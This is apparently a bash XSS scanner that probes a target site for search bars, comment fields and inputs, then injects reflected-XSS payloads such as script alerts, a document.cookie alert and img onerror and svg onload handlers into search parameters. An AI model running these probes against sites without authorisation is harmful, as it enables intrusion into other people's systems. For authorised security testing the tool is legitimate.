#!/bin/bash

# clear the screen
clear

# Variables
target=$1
response_code=$(curl -s -o /dev/null -w "%{http_code}" "$target")

# Define color codes
RED='\e[31m'
GREEN='\e[0;32m'
YELLOW='\e[1;33m'
BLUE='\e[0;34m'
MAGENTA='\e[0;35m'
CYAN='\e[0;36m'
WHITE='\e[1;37m'
BLACK='\e[30m'
BG_RED="\e[1;41m"
BG_GREEN="\e[42m"
BG_YELLOW="\e[43m"
BG_BLUE="\e[1;44m"
BG_PURPLE="\e[45m"
BG_WHITE='\e[47m'
BG_CYAN="\e[0;46m"
RESET='\e[0m'
BOLD='\e[1m'
UNDERLINE='\e[4m'

# Banner function to display information about the target
function BANNER() {
    echo -e "${RED} ═╗ ╦╔═╗╔═╗╔╦╗╔═╗╔═╗  "
    echo -e " ╔╩╦╝╚═╗╚═╗ ║ ╠═╣║ ╦  "
    echo -e " ╩ ╚═╚═╝╚═╝ ╩ ╩ ╩╚═╝ ${RESET}"
    echo -e "      By Trabbit      "
    echo "-------------------------------------------------------------------"
    echo "  Target: $target"
    echo "  Response Code: $response_code"
    echo "-------------------------------------------------------------------"
    echo
}

# Check if the target URL is provided
function CHECK_CONFIGS() {
    if [[ -z "$target" ]]; then
        echo -e "${RED}Please provide a target!${RESET}"
        exit 0
    fi
}

# Simplified search bar check based on the presence of the word "search"
function SBAR_CHECK() {
    # Get the HTML content and search for the word "search" in relevant tags or attributes
    search_bar=$(curl -sL "$target" | grep -i -oP '(?:<form[^>]*>.*|<input[^>]+)[^>]*(name|id|class)=[^>]*search[^>]*')

    if [[ -z "$search_bar" ]]; then
        echo -e "[${RED}-${RESET}] No search bar detected."
    else
        echo -e "[${GREEN}+${RESET}] Search bar detected!"
        echo -e "[${GREEN}+${RESET}] HTML snippet containing 'search':\n\n${GREEN}$search_bar${RESET}\n"
    fi

    # Prompt the user to provide the full URL
    read -p "Please provide the full URL (e.g., https://example.com/search?s=test): " search_url
    echo -e "-----------------------------------------------------------------------------"

    # Define a list of multiple XSS payloads
    XSS_PAYLOADS=( "<h1>XSS</h1>"
                    "<p>XSS</p>"
                    "<script>alert('XSS')</script>"
                    "<script>alert(document.cookie)</script>"
                    "<body onload='alert('XSS')'></body>"
                    "<img src='x' onerror='alert(1)'>"
                    "<a href='javascript:alert(1)'>click me</a>"
                    "<svg onload='alert('XSS')'></svg>" )

    # Extract all parameters from the URL
    params=$(echo $search_url | sed -E 's/^[^?]+\?//')

    # Loop through all parameters and inject the XSS payloads into search-related ones
    for param in $(echo $params | tr '&' '\n'); do
        key=$(echo $param | cut -d'=' -f1)

        if [[ "$key" == "s" || "$key" == "q" || "$key" == "search" || "$key" == "query" || "$key" == "keyword" ]]; then
            # Iterate through each payload and test
            for XSS_PAYLOAD in "${XSS_PAYLOADS[@]}"; do
                modified_url=$(echo $search_url | sed "s#$key=[^&]*#$key=$XSS_PAYLOAD#")
                response=$(curl -sL "$modified_url")

                # Check if the XSS payload appears as text (indicating reflection)
                if echo "$response" | grep -q "$XSS_PAYLOAD"; then
                    echo -e "[${GREEN}+${RESET}] Vulnerability found with payload: $XSS_PAYLOAD"
#                else
#                    echo -e "[${RED}-${RESET}] No XSS vulnerabilities detected with payload: $XSS_PAYLOAD"
                fi
            done
        fi
    done
    echo -e "[ ${YELLOW}done${RESET} ]"
}

# Function to check for a comments section
function CHECK_COMMENTS() {
    comment_section=$(curl -sL "$target" | grep -i -oP '<(textarea|input)[^>]*(class|name|id)?=["'"'"'][^"'"'"'>]*(comment|feedback|reply|message|review)[^"'"'"'>]*')
    echo -e "-----------------------------------------------------------------------------"

    if [[ -n "$comment_section" ]]; then
        echo -e "[${GREEN}+${RESET}] Comment section detected!"
        echo -e "[${GREEN}+${RESET}] HTML snippet containing comment-related elements:\n\n${GREEN}$comment_section${RESET}\n"
    else
        echo -e "[${RED}-${RESET}] No comment section detected."
    fi
    echo -e "-----------------------------------------------------------------------------"
}

# Function to show all <input> tags excluding the ones related to search
function CHECK_INPUTS() {
    all_inputs=$(curl -sL "$target" | grep -oP '<input[^>]+>')

    if [[ -z "$all_inputs" ]]; then
        echo -e "[${RED}-${RESET}] No input tags found."
    else
        echo -e "[${BLUE}*${RESET}] Displaying all <input> tags (excluding search-related ones):"
        echo -e "-----------------------------------------------------------------------------"
        # Exclude inputs already found in the search_bar variable
        echo "$all_inputs" | grep -vF "$search_bar" || echo -e "[${RED}-${RESET}] No other <input> tags found."
    fi
    echo -e "-----------------------------------------------------------------------------"
}

# main function
main() {
    clear
    BANNER
    CHECK_CONFIGS
    SBAR_CHECK
    CHECK_COMMENTS
    CHECK_INPUTS
}

# call the main function
main
